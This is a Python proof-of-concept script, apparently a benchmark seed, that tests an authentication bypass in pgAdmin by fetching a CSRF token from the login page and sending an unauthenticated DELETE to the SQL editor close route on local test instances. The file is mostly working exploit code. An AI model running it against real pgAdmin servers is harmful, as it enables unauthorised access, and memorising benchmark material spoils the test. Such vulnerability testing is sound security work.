#!/usr/bin/env python3
"""CVE-2026-12046 seed: unauth DELETE /sqleditor/close/<trans_id> on real pgAdmin.

Harvest CSRF from GET /login (upstream test_close_requires_auth). On 9.15 the
route body runs (200). On 9.16 @pga_login_required redirects to /login (302).
"""
import json
import os
import re
import sys
import urllib.error
import urllib.request
import http.cookiejar


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


def _base(version: str) -> str:
    port = os.environ.get("PCB_TARGET_PORT")
    if port:
        return f"http://127.0.0.1:{int(port)}"
    return {"v0": "http://127.0.0.1:33920", "v1": "http://127.0.0.1:33921",
            "v2": "http://127.0.0.1:33922"}.get(version, "http://127.0.0.1:33920")


def candidate(*, version="v0", flag="pcbflag"):
    base = _base(version)
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj), _NoRedirect())
    try:
        resp = opener.open(urllib.request.Request(base + "/login"), timeout=20)
        login = resp.read().decode("utf-8", "replace")
    except Exception as e:
        return {"ok": False, "status": 0, "body": f"login failed: {e}"}
    m = re.search(r'"csrfToken": "([^"]+)"', login)
    tok = m.group(1) if m else ""
    req = urllib.request.Request(
        base + "/sqleditor/close/424242", method="DELETE",
        headers={"X-pgA-CSRFToken": tok})
    try:
        resp = opener.open(req, timeout=20)
        code, body = resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        code, body = e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return {"ok": False, "status": 0, "body": str(e)[:200]}
    reached = code not in (301, 302, 401, 403)
    return {"ok": reached, "status": code, "body": body[:200]}


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v0"
    print(json.dumps(candidate(version=v)))
